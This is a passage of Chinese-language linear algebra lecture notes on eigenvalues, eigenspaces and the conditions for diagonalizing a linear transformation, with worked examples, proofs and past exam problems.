<p><strong>注</strong>：本题解决过程中告诉我们一个解题技巧，如果看到<span class="arithmatex">\(A\)</span>的多项式<span class="arithmatex">\(f(A) = O\)</span>这种形式的表达式，事实上<span class="arithmatex">\(A\)</span>的特征值只能是<span class="arithmatex">\(f(\lambda) = 0\)</span>的根，如上题中<span class="arithmatex">\(f(A) = A^2 - E\)</span>，则<span class="arithmatex">\(f(\lambda) = \lambda^2 - 1\)</span>，因此<span class="arithmatex">\(A\)</span>的特征值只能是<span class="arithmatex">\(\pm 1\)</span>。</p>
<p>同理，我们可以知道幂等矩阵的特征值只能是0和1，幂零矩阵的特征值只能是0（这是一个重要的幂零矩阵等价条件，未来我们会再次遇到）。</p>
<p>8
 <strong>设</strong> <span class="arithmatex">\(BX = \lambda_i X_i\ (X_i \neq 0,\enspace i = 1,\ldots,n)\)</span>，则<br />
   $$ AX_i = \lambda_0 X_i + BX_i = \lambda_0 X_i + \lambda_i X_i = (\lambda_0 + \lambda_i) X_i $$<br />
   因此<span class="arithmatex">\(\lambda_0 + \lambda_i \ (i = 1,\ldots,n)\)</span>都是<span class="arithmatex">\(A\)</span>的特征值。</p>
<p>9
 <strong>证明</strong>：</p>
<div class="arithmatex">\[ |\lambda E - A| = \begin{vmatrix}
       \lambda E_1 - A_1 &amp; 0 &amp; \cdots &amp; 0 \\
       0 &amp; \lambda E_2 - A_2 &amp; \cdots &amp; 0 \\
       \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
       0 &amp; 0 &amp; \cdots &amp; \lambda E_m - A_m
   \end{vmatrix} = \prod_{i=1}^{m} |\lambda E_i - A_i| = 0 
\]</div>
<p>因此，<span class="arithmatex">\(A_i,\enspace i = 1,\ldots,m\)</span>的特征值都是<span class="arithmatex">\(A\)</span>的特征值。</p>
</details>
<div class="admonition example">
<p class="admonition-title">Example</p>
<ul>
<li>
<p>设<span class="arithmatex">\(\alpha=(1,0,-1)^\mathrm{T}\)</span>，且<span class="arithmatex">\(A=\alpha\alpha^\mathrm{T}\)</span>，求<span class="arithmatex">\(|6E-A^n|\)</span>；</p>
</li>
<li>
<p>设<span class="arithmatex">\(A\)</span>为三阶矩阵，其特征值为<span class="arithmatex">\(1,-2,-1\)</span>，求<span class="arithmatex">\(|A|\)</span>，<span class="arithmatex">\(A^*+3E\)</span>的特征值，<span class="arithmatex">\((A^{-1})^2+2E\)</span>的特征值以及<span class="arithmatex">\(|A^2-A+E|\)</span>；</p>
</li>
<li>
<p>设<span class="arithmatex">\(A\)</span>为三阶矩阵，<span class="arithmatex">\(A^2-A-2E=O\)</span>，<span class="arithmatex">\(|A|=2\)</span>，求<span class="arithmatex">\(|A^*+3E|\)</span>；</p>
</li>
<li>
<p>设<span class="arithmatex">\(A\)</span>为三阶矩阵，其特征值为<span class="arithmatex">\(-1,-1,5\)</span>，求<span class="arithmatex">\(A_{11}+A_{22}+A_{33}\)</span>；</p>
</li>
</ul>
<details class="answer">
<summary>Answer</summary>
<ul>
<li>
<p>事实上<span class="arithmatex">\(A=\alpha\alpha^\mathrm{T}=\begin{pmatrix}
              1 &amp; 0 &amp; -1 \\ 0 &amp; 0 &amp; 0 \\ -1 &amp; 0 &amp; 1
          \end{pmatrix}\)</span>，由<span class="arithmatex">\(|\lambda E-A|=0\)</span>解得<span class="arithmatex">\(A\)</span>的特征值为<span class="arithmatex">\(\lambda_1=\lambda_2=0,\lambda_3=2\)</span>，而根据<span class="arithmatex">\(A^n\)</span>的特征值性质可知，<span class="arithmatex">\(6E-A^n\)</span>的特征值为<span class="arithmatex">\(6-\lambda_1^n,6-\lambda_2^n,6-\lambda_3^n\)</span>，即<span class="arithmatex">\(6,6,6-2^n\)</span>，因此<span class="arithmatex">\(|6E-A^n|=6^2(6-2^n)=36(6-2^n)\)</span>.</p>
</li>
<li>
<p>由于<span class="arithmatex">\(A\)</span>的特征值为<span class="arithmatex">\(1,-2,-1\)</span>，因此<span class="arithmatex">\(|A|=1\times(-2)\times(-1)=2\)</span>，而<span class="arithmatex">\(A^*\)</span>的特征值为<span class="arithmatex">\(|A|\lambda^{-1}\)</span>，因此<span class="arithmatex">\(A^*\)</span>的特征值为<span class="arithmatex">\(2,-1,-2\)</span>，故<span class="arithmatex">\(A^*+3E\)</span>的特征值为<span class="arithmatex">\(A^*\)</span>的特征值加3（即为<span class="arithmatex">\(5,2,1\)</span>，又根据<span class="arithmatex">\(A^{-1}\)</span>和<span class="arithmatex">\(A^2\)</span>特征值的性质可知，<span class="arithmatex">\((A^{-1})^2+2E\)</span>的特征值为<span class="arithmatex">\(1^2+2,(-1/2)^2+2,(-1)^2+2\)</span>，即为<span class="arithmatex">\(3,9/4,3\)</span>，而<span class="arithmatex">\(A^2-A+E\)</span>的特征值根据<span class="arithmatex">\(f(\sigma)\)</span>特征值性质的讨论可知为<span class="arithmatex">\(1^2-1+1,(-2)^2-(-2)+1,(-1)^2-(-1)+1\)</span>，即为<span class="arithmatex">\(1,7,3\)</span>，因此<span class="arithmatex">\(|A^2-A+E|=1\times 7\times 3=21\)</span>.</p>
</li>
<li>
<p>设<span class="arithmatex">\(AX=\lambda X(X\neq 0)\)</span>，则<span class="arithmatex">\((A^2-A-2E)X=(\lambda^2-\lambda-2)X=O\)</span>，因此<span class="arithmatex">\(\lambda=-1\)</span>或<span class="arithmatex">\(\lambda=2\)</span>，根据对合矩阵的讨论可知，<span class="arithmatex">\(A\)</span>的特征值恰为-1和2. 又<span class="arithmatex">\(|A|=2\)</span>，且<span class="arithmatex">\(A\)</span>为3阶矩阵，因此<span class="arithmatex">\(A\)</span>的3个特征值必为-1，-1，2.</p>
</li>
</ul>
<p>又<span class="arithmatex">\(A^*\)</span>的特征值为<span class="arithmatex">\(|A|\lambda^{-1}\)</span>，因此<span class="arithmatex">\(A^*\)</span>的特征值为<span class="arithmatex">\(1,-2,-2\)</span>，<span class="arithmatex">\(A^*+3E\)</span>的特征值为<span class="arithmatex">\(A^*\)</span>的特征值加3，即<span class="arithmatex">\(\lambda_1=\lambda_2=1,\lambda_3=4\)</span>，故<span class="arithmatex">\(|A^*+3E|=\lambda_1\lambda_2\lambda_3=4\)</span>.</p>
<ul>
<li>由题意知<span class="arithmatex">\(|A|=5\)</span>，故<span class="arithmatex">\(A^*\)</span>的特征值为<span class="arithmatex">\(|A|\lambda^{-1}\)</span>即为<span class="arithmatex">\(\mu_1=\mu_2=-5,\mu_3=1\)</span>，而<span class="arithmatex">\(A_{11}+A_{22}+A_{33}\)</span>就是<span class="arithmatex">\(A^*\)</span>的迹（即矩阵对角线元素之和），因此<span class="arithmatex">\(A_{11}+A_{22}+A_{33}=\mu_1+\mu_2+\mu_3=-9\)</span>.</li>
</ul>
</details>
</div>
<h3 id="note-la-eigenvalue-_7">特征向量与特征子空间的性质<a class="headerlink" href="#note-la-eigenvalue-_7" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p><span class="arithmatex">\(\sigma\)</span>的不同特征值对应的特征向量线性无关；</p>
</li>
<li>
<p><span class="arithmatex">\(\sigma\)</span>的不同特征值对应的特征子空间的和为直和；</p>
</li>
<li>
<p><span class="arithmatex">\(\sigma\)</span>最多有<span class="arithmatex">\(\dim V\)</span>个不同的特征值.</p>
</li>
</ul>
<p>有以下推论</p>
<details class="proof">
<summary>Proof</summary>
<ul>
<li><strong>设</strong> <span class="arithmatex">\(\lambda_1, \ldots, \lambda_m\)</span> 是 <span class="arithmatex">\(\sigma\)</span> 的互异特征值，<span class="arithmatex">\(\xi_1, \ldots, \xi_m\)</span> 是相应的特征向量。反证法，我们假设 <span class="arithmatex">\(\xi_1, \ldots, \xi_m\)</span> 线性相关，由线性相关性引理可知，存在 <span class="arithmatex">\(k\)</span> 是使得  </li>
</ul>
<div class="arithmatex">\[ \xi_k \in \mathbf{spa}(\xi_1, \ldots, \xi_{k-1}) \]</div>
<p>成立的最小整数，则存在 <span class="arithmatex">\(c_1, \ldots, c_{k-1}\)</span> 使得  </p>
<p>$$ \xi_k = c_1\xi_1 + \cdots + c_{k-1}\xi_{k-1}. $$  </p>
<p>将 <span class="arithmatex">\(\sigma\)</span> 作用到上式两边，我们有  </p>
<p>$$ \lambda_k \xi_k = c_1 \lambda_1 \xi_1 + \cdots + c_{k-1} \lambda_{k-1} \xi_{k-1}. $$  </p>
<p>将上式两边乘以 <span class="arithmatex">\(\lambda_k\)</span>，然后减去上式，我们有  </p>
<p>$$ 0 = c_1 (\lambda_k - \lambda_1)\xi_1 + \cdots + c_{k-1} (\lambda_k - \lambda_{k-1})\xi_{k-1}. $$  </p>
<p>由于我们选取的 <span class="arithmatex">\(k\)</span> 是满足 <span class="arithmatex">\(\xi_k \in \mathbf{spa}(\xi_1, \ldots, \xi_{k-1})\)</span> 的最小整数，因此 <span class="arithmatex">\(\xi_1, \ldots, \xi_{k-1}\)</span> 线性无关，故 <span class="arithmatex">\(c_1 = \cdots = c_{k-1} = 0\)</span>，因此 <span class="arithmatex">\(\xi_k = 0\)</span>，这与 <span class="arithmatex">\(\xi_k\)</span> 是特征向量矛盾，因此 <span class="arithmatex">\(\xi_1, \ldots, \xi_m\)</span> 线性无关。</p>
<ul>
<li><strong>回忆直和的证明方法</strong>，我们选取合适等价命题进行证明。假设  </li>
</ul>
<p>$$ \xi_1 + \cdots + \xi_m = 0, $$  </p>
<p>其中 <span class="arithmatex">\(\xi_i \in V_{\lambda_i}\)</span>，由于 <span class="arithmatex">\(\sigma\)</span> 的不同特征值对应的特征向量线性无关，因此 <span class="arithmatex">\(\xi_1, \ldots, \xi_m\)</span> 不可能是特征向量，否则可知它们线性相关，故必有 <span class="arithmatex">\(\xi_1 = \cdots = \xi_m = 0\)</span>，这表明 <span class="arithmatex">\(\sigma\)</span> 的不同特征值对应的特征子空间的和为直和。</p>
<ul>
<li><strong>设</strong> <span class="arithmatex">\(\lambda_1, \ldots, \lambda_m\)</span> 是 <span class="arithmatex">\(\sigma\)</span> 的互异特征值，<span class="arithmatex">\(\xi_1, \ldots, \xi_m\)</span> 是相应的特征向量。前面已经证明了 <span class="arithmatex">\(\xi_1, \ldots, \xi_m\)</span> 线性无关，因此 <span class="arithmatex">\(\dim V \geqslant m\)</span>，得证。</li>
</ul>
</details>
<ul>
<li>
<p>若<span class="arithmatex">\(\lambda_1,\ldots,\lambda_m\)</span>是线性映射<span class="arithmatex">\(\sigma\)</span>互异的特征值，则<span class="arithmatex">\(V_{\lambda_i}\cap\sum\limits_{j\neq i}V_{\lambda_j}=\{0\}
              \enspace(i=1,\ldots,m)\)</span>，则一个特征向量不能属于多个特征值. </p>
</li>
<li>
<p><span class="arithmatex">\(\sigma\)</span>的不同特征值<span class="arithmatex">\(\lambda_1,\ldots,\lambda_m\)</span>对应的特征子空间<span class="arithmatex">\(V_{\lambda_1},\ldots,V_{\lambda_m}\)</span>的基向量合在一起构成的向量组线性无关，且是<span class="arithmatex">\(V_{\lambda_1}+V_{\lambda_2}+\cdots+V_{\lambda_m}\)</span>的基.</p>
</li>
</ul>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<ul>
<li>代数重数:某一特征值<span class="arithmatex">\(\lambda\)</span>的代数重数指重根的个数；</li>
<li>几何重数:某一特征值的几何重数指特征向量生成线性空间的维数</li>
</ul>
</div>
<p><mark class="critic">若<span class="arithmatex">\(\lambda\)</span>是<span class="arithmatex">\(\sigma\)</span>的特征值，则<span class="arithmatex">\(\lambda\)</span>的代数重数大于等于几何重数</mark></p>
<p>我们思考，如果所有的特征子空间已经是全空间<span class="arithmatex">\(V\)</span>,那么是否所有向量都是特征向量呢?下面的例子告诉我们不是这样的,事实上，只有当特征值唯一的时候，这个结论才正确:</p>
<div class="admonition example">
<p class="admonition-title">2013-2014期末</p>
<p>设 <span class="arithmatex">\(V(\mathbf{F})\)</span> 是 <span class="arithmatex">\(n\)</span> 维线性空间，<span class="arithmatex">\(\sigma \in \mathcal{L}(V)\)</span>，证明：</p>
<ol>
<li>若 <span class="arithmatex">\(\alpha, \beta\)</span> 是 <span class="arithmatex">\(\sigma\)</span> 的属于不同特征值的特征向量，则 <span class="arithmatex">\(c_1c_2 \neq 0\)</span> 时，<span class="arithmatex">\(c_1 \alpha + c_2 \beta\)</span> 不是 <span class="arithmatex">\(\sigma\)</span> 的特征向量；</li>
<li><span class="arithmatex">\(V\)</span> 中的每一非零向量都是 <span class="arithmatex">\(\sigma\)</span> 的特征向量 <span class="arithmatex">\(\iff \sigma = c_0 I_V\)</span>，其中 <span class="arithmatex">\(c_0 \in \mathbf{F}\)</span> 是一个常数，<span class="arithmatex">\(I_V\)</span> 是恒等变换。</li>
</ol>
<details class="proof">
<summary>Proof</summary>
<ol>
<li>
<p>设 <span class="arithmatex">\(\sigma(\alpha) = \lambda_1 \alpha, \sigma(\beta) = \lambda_2 \beta\)</span>，其中 <span class="arithmatex">\(\lambda_1 \neq \lambda_2\)</span>，并假设 <span class="arithmatex">\(c_1 \alpha + c_2 \beta\)</span> 是 <span class="arithmatex">\(\sigma\)</span> 的特征向量，即存在 <span class="arithmatex">\(\lambda_0 \in \mathbf{F}\)</span> 使得<br />
   $$ \sigma(c_1 \alpha + c_2 \beta) = \lambda_0 (c_1 \alpha + c_2 \beta). $$<br />
   展开括号，我们有<br />
   $$ c_1 \sigma(\alpha) + c_2 \sigma(\beta) = c_1 \lambda_0 \alpha + c_2 \lambda_0 \beta. $$<br />
   即<br />
   $$ c_1 \lambda_1 \alpha + c_2 \lambda_2 \beta = c_1 \lambda_0 \alpha + c_2 \lambda_0 \beta, $$<br />
   即<br />
   $$ (\lambda_1 - \lambda_0) c_1 \alpha + (\lambda_2 - \lambda_0) c_2 \beta = 0. $$<br />
   由于 <span class="arithmatex">\(\alpha, \beta\)</span> 线性无关，因此<br />
   $$ c_1 (\lambda_1 - \lambda_0) = c_2 (\lambda_2 - \lambda_0) = 0. $$<br />
   当 <span class="arithmatex">\(c_1 c_2 \neq 0\)</span> 时，我们有 <span class="arithmatex">\(\lambda_1 = \lambda_0 = \lambda_2\)</span>，这与 <span class="arithmatex">\(\lambda_1 \neq \lambda_2\)</span> 矛盾，因此 <span class="arithmatex">\(c_1 \alpha + c_2 \beta\)</span> 不是 <span class="arithmatex">\(\sigma\)</span> 的特征向量。</p>
</li>
<li>
<p>右推左显然，我们只考虑左推右的证明。由上一小问结论可知，若 <span class="arithmatex">\(V\)</span> 中的每一非零向量都是 <span class="arithmatex">\(\sigma\)</span> 的特征向量，<span class="arithmatex">\(\sigma\)</span> 不可能有不同的特征值（因为有不同的特征值就有不同特征值对应的特征向量，但它们的线性组合一定仍在 <span class="arithmatex">\(V\)</span> 中，这与从第一问中得到的结论，即它不是 <span class="arithmatex">\(\sigma\)</span> 的特征向量矛盾）。设 <span class="arithmatex">\(c_0\)</span> 是 <span class="arithmatex">\(\sigma\)</span> 的唯一的特征值，则对于任意 <span class="arithmatex">\(\alpha \in V\)</span>，我们有 <span class="arithmatex">\(\sigma(\alpha) = c_0 \alpha\)</span>，即 <span class="arithmatex">\(\sigma\)</span> 在任意元素上的像都已经唯一确定，则显然在 <span class="arithmatex">\(V\)</span> 的一组基上的像也唯一确定，由线性映射唯一确定的定理可知这样的线性映射是唯一的，<span class="arithmatex">\(\sigma = c_0 I_V\)</span> 符合要求，因此它就是我们要找的线性映射。</p>
</li>
</ol>
</details>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>设 <span class="arithmatex">\(A\)</span> 是数域 <span class="arithmatex">\(\mathbf{F}\)</span> 上一个 <span class="arithmatex">\(n\)</span> 阶方阵，<span class="arithmatex">\(E\)</span> 是 <span class="arithmatex">\(n\)</span> 阶单位矩阵，<span class="arithmatex">\(\alpha_1 \in \mathbf{F}^n\)</span> 是 <span class="arithmatex">\(A\)</span> 的属于特征值 <span class="arithmatex">\(\lambda\)</span> 的一个特征向量，向量组 <span class="arithmatex">\(\alpha_1, \alpha_2, \ldots, \alpha_s\)</span> 按如下方式产生：  </p>
<div class="arithmatex">\[(A - \lambda E) \alpha_{i+1} = \alpha_i, \quad i = 1, 2, \ldots, s-1.\]</div>
<p>证明向量组 <span class="arithmatex">\(\{\alpha_1, \alpha_2, \ldots, \alpha_s\}\)</span> 线性无关。</p>
<details class="proof">
<summary>Proof</summary>
<p>由于 <span class="arithmatex">\(\alpha_1\)</span> 是 <span class="arithmatex">\(A\)</span> 属于特征值 <span class="arithmatex">\(\lambda\)</span> 的特征向量，故有 <span class="arithmatex">\((A - \lambda E) \alpha_1 = 0\)</span>。</p>
<p>设<br />
$$ \sum_{i=1}^{s} k_i \alpha_i = 0, $$<br />
两边同时左乘 <span class="arithmatex">\((A - \lambda E)\)</span> 可得<br />
$$ (A - \lambda E) \sum_{i=1}^{s} k_i \alpha_i = \sum_{i=1}^{s} k_i (A - \lambda E) \alpha_i = k_1 (A - \lambda E) \alpha_1 + \sum_{i=1}^{s-1} k_{i+1} \alpha_i = \sum_{i=1}^{s-1} k_{i+1} \alpha_i = 0. $$</p>
<p>以此类推，在等式两边不断左乘 <span class="arithmatex">\((A - \lambda E)\)</span> 可得：对于 <span class="arithmatex">\(\forall r \in \{1, \cdots, s-1\}\)</span> 都有<br />
$$ \sum_{i=1}^{s-r} k_{i+r} \alpha_i = 0. $$</p>
<p>令 <span class="arithmatex">\(r = s-1\)</span> 得到 <span class="arithmatex">\(k_s \alpha_1 = 0, \quad k_s = 0\)</span>。再依次代回不难得到 <span class="arithmatex">\(k_i = 0, \quad \forall i \in \{1, \cdots, s\}\)</span>，从而向量组 <span class="arithmatex">\(\alpha_1, \cdots, \alpha_s\)</span> 线性无关。</p>
</details>
</div>
<h2 id="note-la-eigenvalue-_8">可对角化的条件<a class="headerlink" href="#note-la-eigenvalue-_8" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">可对角化</p>
<p>设<span class="arithmatex">\(\sigma\in\mathcal{L}(V)\)</span>，如果存在<span class="arithmatex">\(V\)</span>的一组基使得<span class="arithmatex">\(\sigma\)</span>在这组基下的矩阵是对角矩阵，则称<span class="arithmatex">\(\sigma\)</span>可对角化.</p>
</div>
<p>设<span class="arithmatex">\(V\)</span>是数域<span class="arithmatex">\(\mathbf{F}\)</span>上的<span class="arithmatex">\(n\)</span>维线性空间，<span class="arithmatex">\(\sigma\)</span>是<span class="arithmatex">\(V\)</span>上的线性变换，<span class="arithmatex">\(\lambda_1,\lambda_2,\ldots,\lambda_s\in\mathbf{F}\)</span>是<span class="arithmatex">\(\sigma\)</span>的所有互异特征值，则以下条件等价：</p>
<ol>
<li><span class="arithmatex">\(\sigma\)</span> 可对角化；</li>
<li><span class="arithmatex">\(\sigma\)</span> 有 <span class="arithmatex">\(n\)</span> 个线性无关的特征向量，它们构成 <span class="arithmatex">\(V\)</span> 的一组基；</li>
<li><span class="arithmatex">\(V\)</span> 有在 <span class="arithmatex">\(\sigma\)</span> 下不变的一维子空间 <span class="arithmatex">\(U_1, \ldots, U_n\)</span>，使得 <span class="arithmatex">\(V = U_1 \oplus \cdots \oplus U_n\)</span>；</li>
<li><span class="arithmatex">\(V = V_{\lambda_1} \oplus V_{\lambda_2} \oplus \cdots \oplus V_{\lambda_s}\)</span>；</li>
<li><span class="arithmatex">\(n = \dim V_{\lambda_1} + \dim V_{\lambda_2} + \cdots + \dim V_{\lambda_s}\)</span>；</li>
<li><span class="arithmatex">\(\sigma\)</span> 每个特征值的代数重数等于几何重数。</li>
</ol>
<p>有推论</p>
<p>若 <span class="arithmatex">\(n\)</span> 阶矩阵 <span class="arithmatex">\(A\)</span> 有 <span class="arithmatex">\(n\)</span> 个不同的特征值，则 <span class="arithmatex">\(A\)</span> 可对角化. 反之，<span class="arithmatex">\(A\)</span> 可对角化不一定有 <span class="arithmatex">\(n\)</span> 个特征值.</p>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>总结而言，只要特征子空间可以张成整个空间，那么这个线性变换就是可对角化的。</p>
</div>
<h3 id="note-la-eigenvalue-_9">对角化的基本步骤<a class="headerlink" href="#note-la-eigenvalue-_9" title="Permanent link">&para;</a></h3>
<ol>
<li>先任意写出 <span class="arithmatex">\(\sigma\)</span> 在一组基 <span class="arithmatex">\(\mathbf{B}\)</span> 下的矩阵 <span class="arithmatex">\(A\)</span>，当然为了计算方便一般选取自然基；</li>
<li>利用特征多项式 <span class="arithmatex">\(f(\lambda) = |\lambda E − A| = 0\)</span> 求出 <span class="arithmatex">\(A\)</span> 的所有不同特征值；</li>
<li>解线性方程组 <span class="arithmatex">\(AX = \lambda X\)</span>（实际上就是方程组 <span class="arithmatex">\((\lambda E − A)X = 0\)</span>，其中 <span class="arithmatex">\(\lambda\)</span> 是上一步求
出的特征值）求出 <span class="arithmatex">\(A\)</span> 在不同特征值下的线性无关特征向量；</li>
<li>第三步中求得的所有向量就是 <span class="arithmatex">\(\lambda\)</span> 的特征向量在基 <span class="arithmatex">\(B\)</span> 下的坐标，根据前面的讨论，<span class="arithmatex">\(\sigma\)</span>
的特征向量也就是使得 <span class="arithmatex">\(\sigma\)</span> 的矩阵表示为对角矩阵的那组基.</li>
<li>当然，如果题目中直接给出求 <span class="arithmatex">\(P\)</span> 使得 <span class="arithmatex">\(P^{−1}AP\)</span> 为对角矩阵，那么我们只需进行 2、3
两步，并将 3 中得到的向量按列排列成矩阵 P 即可
6.如果要求<span class="arithmatex">\(P\)</span>是正交矩阵，那么3中求出来的所有向量需要在 <strong>各自的特征子空间中正交化</strong> 。</li>
</ol>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>求矩阵</p>
<div class="arithmatex">\[A=\begin{pmatrix}
        0  &amp; -1 &amp; 1 \\
        -1 &amp; 0  &amp; 1 \\
        1  &amp; 1  &amp; 0
    \end{pmatrix}
\]</div>
<p>的所有特征值，对应的特征子空间，以及与 <span class="arithmatex">\(A\)</span> 相似的一个对角矩阵.</p>
<details class="answer">
<summary>Answer</summary>
<p>对于求解矩阵的对角化问题，首先求出其特征多项式（具体步骤不展开，实际上就是三阶行列式的计算，可以使用按行（列）展开、公式法或者初等变换化为三角矩阵等方法）<span class="arithmatex">\(f(\lambda)=|\lambda E-A|=(\lambda-1)^2(\lambda+2)\)</span>，令<span class="arithmatex">\(f(\lambda)=0\)</span>，解得特征值为 <span class="arithmatex">\(\lambda_1=\lambda_2=1,\lambda_3=-2\)</span>.</p>
<p>接下来求解特征向量和特征子空间，即求解<span class="arithmatex">\((E-A)x=0\)</span>和解<span class="arithmatex">\((-2E-A)x=0\)</span>，得到特征值1对应的特征子空间为<span class="arithmatex">\(\mathbf{spa}((-1,1,0)^{\mathrm{T}},(1,0,1)^{\mathrm{T}})\)</span>，特征值-2对应的特征子空间为<span class="arithmatex">\(\mathbf{spa}((-1,-1,1)^{\mathrm{T}})\)</span>.</p>
<p>与<span class="arithmatex">\(A\)</span>相似的对角矩阵实际上就是特征值排列在对角线上的结果，即 <span class="arithmatex">\(\mathbf{diag}(1,1,-2)\)</span>.</p>
</details>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>设 <span class="arithmatex">\(T\)</span> 是次数小于等于 2 的实多项式线性空间 <span class="arithmatex">\(V\)</span> 上的变换，对任意 <span class="arithmatex">\(f(x) \in V\)</span>，定义</p>
<div class="arithmatex">\[T(f(x))=\frac{\mathrm{d}((x-2)f(x))}{\mathrm{d}x}\]</div>
<p>证明 <span class="arithmatex">\(T\)</span> 是 <span class="arithmatex">\(V\)</span> 上的线性变换，且<span class="arithmatex">\(T\)</span>可对角化.</p>
<details class="answer">
<summary>Answer</summary>
<p>首先证明这是线性变换. 首先验证线性性，对于任意<span class="arithmatex">\(f(x),g(x)\in V\)</span>，<span class="arithmatex">\(a,b\in\mathbf{R}\)</span>，我们有</p>
<div class="arithmatex">\[\begin{align*}
    T(af(x)+bg(x)) &amp; =\frac{\mathrm{d}((x-2)(af(x)+bg(x)))}{\mathrm{d}x}                                    \\
                     &amp; =\frac{\mathrm{d}(axf(x)-2af(x)+bxg(x)-2bg(x))}{\mathrm{d}x}                           \\
                     &amp; =a\frac{\mathrm{d}((x-2)f(x))}{\mathrm{d}x}+b\frac{\mathrm{d}((x-2)g(x))}{\mathrm{d}x} \\
                     &amp; =aT(f(x))+bT(g(x)).
\end{align*}\]</div>
<p>然后说明这是<span class="arithmatex">\(V\)</span>上的线性变换，即该映射的到达空间是<span class="arithmatex">\(V\)</span>，即<span class="arithmatex">\(T(f(x))\in V\)</span>， 因为<span class="arithmatex">\(f(x)\)</span>是次数小于等于2的实多项式，设<span class="arithmatex">\(f(x)=ax^2+bx+c\)</span>，则</p>
<div class="arithmatex">\[\begin{align*}
      T(f(x)) &amp; =\frac{\mathrm{d}((x-2)(ax^2+bx+c))}{\mathrm{d}x}          \\
              &amp; =\frac{\mathrm{d}(ax^3+(b-2a)x^2+(c-2b)x-2c)}{\mathrm{d}x} \\
              &amp; =3ax^2+2(b-2a)x+(c-2b)\in V.
\end{align*}\]</div>
<p>因此<span class="arithmatex">\(T\)</span>是<span class="arithmatex">\(V\)</span>上的线性变换.</p>
<p>下面我们来判断<span class="arithmatex">\(T\)</span>是否可对角化. 线性变换的可对角化问题第一步要转化为任意一组基下的矩阵，然后判断矩阵是否可对角化，因此我们先任意选取一组基，为方便我们选取自然基<span class="arithmatex">\(\{1,x,x^2\}\)</span>，然后求出<span class="arithmatex">\(T\)</span>在这组基下的矩阵<span class="arithmatex">\(A=\begin{pmatrix}
       1 &amp; -2 &amp; 0 \\ 0 &amp; 2 &amp; -4 \\ 0 &amp; 0 &amp; 3
\end{pmatrix}\)</span>，然后求出其特征多项式<span class="arithmatex">\(f(\lambda)=|\lambda E-A|=(\lambda-1)(\lambda-2)(\lambda-3)\)</span>，令<span class="arithmatex">\(f(\lambda)=0\)</span>，解得特征值为 <span class="arithmatex">\(\lambda_1=1,\lambda_2=2,\lambda_3=3\)</span>. 即该3阶矩阵有3个不同的特征值，因此可知<span class="arithmatex">\(A\)</span>可对角化，即<span class="arithmatex">\(T\)</span>可对角化.</p>
</details>
</div>
<h3 id="note-la-eigenvalue-_10">经典问题<a class="headerlink" href="#note-la-eigenvalue-_10" title="Permanent link">&para;</a></h3>
<div class="admonition question">
<p class="admonition-title">可对角化求矩阵幂</p>
<p>已知<span class="arithmatex">\(A=\begin{pmatrix}
        0 &amp; \dfrac{1}{2}  &amp; \dfrac{1}{2} \\[2ex]
        1 &amp; -\dfrac{1}{2} &amp; \dfrac{1}{2} \\[2ex]
        1 &amp; -\dfrac{1}{2} &amp; \dfrac{1}{2}
    \end{pmatrix}\)</span>，求<span class="arithmatex">\(A^n\)</span>.</p>
<details class="answer">
<summary>Answer</summary>
<p>首先求出<span class="arithmatex">\(A\)</span>的特征多项式<span class="arithmatex">\(f(\lambda)=|\lambda E-A|=\lambda(\lambda-1)(\lambda+1)\)</span>，令<span class="arithmatex">\(f(\lambda)=0\)</span>，解得特征值为 <span class="arithmatex">\(\lambda_1=0,\lambda_2=1,\lambda_3=-1\)</span>.</p>
<p>接下来求解特征向量和特征子空间，实际上就是求解<span class="arithmatex">\((0E-A)x=0,(-E-A)x=0,(E-A)x=0\)</span>，得到特征向量为</p>
<div class="arithmatex">\[\eta_1=\begin{pmatrix}
       1 \\ 1 \\ -1
   \end{pmatrix},\enspace \eta_2=\begin{pmatrix}
       1 \\ 1 \\ 1
   \end{pmatrix},\enspace \eta_3=\begin{pmatrix}
       1 \\ -1 \\ -1
   \end{pmatrix}.\]</div>
<p>所以记<span class="arithmatex">\(P=(\eta_1,\eta_2,\eta_3)\)</span>，则<span class="arithmatex">\(A=P\mathbf{diag}(0,1,-1)P^{-1}\)</span>，因此</p>
<div class="arithmatex">\[
    A^n=P\mathbf{diag}(0^n,1^n,(-1)^n)P^{-1}
\]</div>
<p>进一步计算得到</p>
<div class="arithmatex">\[A^n=\frac{1}{2}\begin{pmatrix}
       1+(-1)^n     &amp; (-1)^{n+1} &amp; 1 \\
       1+(-1)^{n+1} &amp; (-1)^n     &amp; 1 \\
       1+(-1)^{n+1} &amp; (-1)^n     &amp; 1
   \end{pmatrix}.\]</div>
</details>
</div>
<div class="admonition question">
<p class="admonition-title">秩1矩阵可对角化条件</p>
<p>设<span class="arithmatex">\(\alpha\)</span>和<span class="arithmatex">\(\beta\)</span>是<span class="arithmatex">\(\mathbf{R}^n\enspace (n&gt;1)\)</span>中两个列向量，<span class="arithmatex">\(A=\alpha\beta^\mathrm{T}\neq O\)</span>.</p>
<ul>
<li>
<p>求<span class="arithmatex">\(A\)</span>的特征值；</p>
</li>
<li>
<p>证明：<span class="arithmatex">\(\alpha^\mathrm{T}\beta=0\iff A\)</span>不可对角化.</p>
</li>
</ul>
<details class="answer">
<summary>Answer</summary>
<ul>
<li>我们知道，<span class="arithmatex">\(r(A)\leqslant\min{\{r(\alpha),r(\beta)\}}=1\)</span>，并且<span class="arithmatex">\(A\neq O\)</span>因此<span class="arithmatex">\(r(A)&gt;0\)</span>，故<span class="arithmatex">\(A\)</span>的秩为1. 而<span class="arithmatex">\(n&gt;1\)</span>，因此<span class="arithmatex">\(A\)</span>一定不可逆，故0一定是<span class="arithmatex">\(A\)</span>的特征值，且对应的特征子空间维数为<span class="arithmatex">\(AX=0\)</span>的解空间维数，即为<span class="arithmatex">\(n-1\)</span>.</li>
</ul>
